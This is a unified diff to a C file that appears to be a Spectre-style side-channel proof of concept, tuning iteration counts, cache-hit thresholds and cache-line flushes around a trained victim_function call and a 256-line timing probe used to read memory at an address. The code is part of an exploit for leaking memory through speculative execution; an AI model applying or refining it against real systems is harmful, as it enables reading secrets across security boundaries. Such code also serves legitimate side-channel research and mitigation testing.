@@ -17,15 +17,16 @@
 #endif
 
 #define MIN_ITERATIONS 1
-#define MAX_ITERATIONS 500
+#define MAX_ITERATIONS 500000
 #define BRANCH_TRAINS 32
 #define PAGE_SIZE 4096
+//#define PAGE_SIZE (1<<20)
 #define CUTOFF_TIME 500
-#define CACHE_HIT_COEFF 3
+#define CACHE_HIT_COEFF 4
 
 FILE *output = NULL;
 
-uint8_t side_effects[256 * PAGE_SIZE] = {0xda}; // Not zero because 0-page
+uint8_t side_effects[256L * PAGE_SIZE] = {0xda}; // Not zero because 0-page
 size_t array_size = BRANCH_TRAINS;
 uint8_t base_array[BRANCH_TRAINS];
 
@@ -45,9 +46,11 @@ uint8_t read_at(uint64_t addr) {
       _mm_clflush(&array_size);
     }
     _mm_clflush(&array_size);
+    _mm_clflush(base_array);
+    _mm_clflush(&side_effects[0]);
     victim_function(addr);
 
-    for (size_t i = 1; i < 256; i++) {
+    for (size_t i = 0; i < 256; i++) {
       register uint64_t time;
    
       __sync_synchronize(); // Following code has to be executed in correct order, so we synchronize the pipeline
